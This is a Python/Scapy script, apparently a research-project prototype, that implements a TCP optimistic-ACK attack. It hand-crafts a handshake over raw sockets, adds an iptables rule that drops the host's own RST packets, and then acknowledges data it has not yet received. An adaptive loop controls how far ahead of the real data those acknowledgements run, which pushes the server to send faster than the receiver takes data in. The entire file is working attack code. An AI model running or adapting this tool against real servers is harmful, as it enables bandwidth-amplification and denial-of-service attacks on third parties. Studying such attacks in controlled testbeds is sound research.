#!/usr/bin/env python3
"""
optack_proto.py -- Scapy prototype of the optimistic-ACK attack (Milestone 2,
stage 1). This is the "validate the packet format and sequence tracking"
prototype from PROJECT_IMPLEMENTATION_PLAN.md before the fast C port
(optack.c) that the M2 gate actually runs.

It is intentionally simple and slow (one Python packet at a time): enough to
prove the handshake and the optimistic-ACK idea are correct, not to hit a
throughput target. Use optack.c for the real measurement.

Like the C tool it drives the whole connection from a raw socket, so it must
suppress the kernel's RST for our source port. It does that with an iptables
rule (needs NET_ADMIN + iptables in the container) and removes it on exit.

Usage:
    python3 optack_proto.py --target server --port 5000 --duration 10
    python3 optack_proto.py --target server --port 5000 --lazy
"""
import argparse
import os
import random
import subprocess
import sys
import time

from scapy.all import IP, TCP, sr1, send, conf

conf.verb = 0


def rst_rule(op, target):
    """Add ('-A') or delete ('-D') the outbound-RST suppressor."""
    subprocess.call(
        ["iptables", op, "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST",
         "-d", target, "-j", "DROP"],
        stderr=subprocess.DEVNULL,
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="server")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--interval-ms", type=float, default=2.0,
                    help="time between ACKs")
    ap.add_argument("--lazy", action="store_true",
                    help="ACK only genuinely received data (fallback variant)")
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.exit("must run as root (raw sockets)")

    sport = random.randint(20000, 60000)
    isn = random.randint(0, 0xFFFFFFFF)
    target = args.target

    print(f"[proto] {target}:{args.port} sport={sport} "
          f"mode={'lazy' if args.lazy else 'optimistic'}")

    rst_rule("-A", target)
    try:
        # ---- handshake ----
        syn = IP(dst=target) / TCP(sport=sport, dport=args.port, flags="S",
                                   seq=isn, window=65535,
                                   options=[("MSS", 1460), ("WScale", 7)])
        synack = sr1(syn, timeout=3)
        if synack is None or "SA" not in synack.sprintf("%TCP.flags%"):
            sys.exit("[proto] no SYN-ACK; handshake failed")

        server_isn = synack[TCP].seq
        rcv_nxt = server_isn + 1          # highest byte actually received
        my_seq = isn + 1
        ack_no = rcv_nxt

        ack = IP(dst=target) / TCP(sport=sport, dport=args.port, flags="A",
                                   seq=my_seq, ack=ack_no, window=65535)
        send(ack)
        print("[proto] established; streaming begins")

        # ---- optimistic-ACK loop (AIMD self-tuning optimism, matches optack.c) ----
        # `ahead` = bytes past genuinely-received data we are willing to ACK.
        # Grow it while fresh data keeps arriving; halve it when the flow stalls
        # (our ACKs overran the server's send pointer). ack_no = rcv_nxt + ahead
        # is always >= rcv_nxt, so it is never a duplicate and never dead-locks.
        AI_STEP = 12 * 1460
        MAX_AHEAD = 4 * 1024 * 1024
        EVAL_S = 0.05                      # slower than optack.c: Scapy is slow
        ahead = 0
        t0 = time.monotonic()
        eval_t, eval_base = t0, rcv_nxt
        acks = 0
        # A lightweight inline sniffer: read one packet per loop, non-blocking.
        s = conf.L3socket(filter=f"tcp and src host {synack[IP].src} "
                                 f"and src port {args.port}")
        while time.monotonic() - t0 < args.duration:
            # drain any received data (non-blocking-ish, short timeout)
            pkt = s.recv()
            if pkt is not None and TCP in pkt:
                payload = len(pkt[TCP].payload)
                if payload:
                    end = (pkt[TCP].seq + payload) & 0xFFFFFFFF
                    if end > rcv_nxt:
                        rcv_nxt = end
                if pkt[TCP].flags & 0x04:  # RST
                    print("[proto] got RST, stopping")
                    break

            t = time.monotonic()
            if not args.lazy and t - eval_t >= EVAL_S:
                if rcv_nxt > eval_base:            # fresh data -> push harder
                    ahead = min(ahead + AI_STEP, MAX_AHEAD)
                else:                              # stalled -> back off
                    ahead //= 2
                eval_base, eval_t = rcv_nxt, t

            ack_no = rcv_nxt if args.lazy else (rcv_nxt + ahead) & 0xFFFFFFFF

            send(IP(dst=target) / TCP(sport=sport, dport=args.port, flags="A",
                                      seq=my_seq, ack=ack_no, window=65535))
            acks += 1
            time.sleep(args.interval_ms / 1000.0)

        recv_bytes = rcv_nxt - (server_isn + 1)
        elapsed = time.monotonic() - t0
        print(f"[proto] done: {elapsed:.1f}s, {acks} ACKs, "
              f"{recv_bytes} bytes seen ({recv_bytes*8/elapsed/1e6:.2f} Mbit/s), "
              f"final optimism {ack_no - rcv_nxt:+d} bytes")
    finally:
        rst_rule("-D", target)


if __name__ == "__main__":
    main()
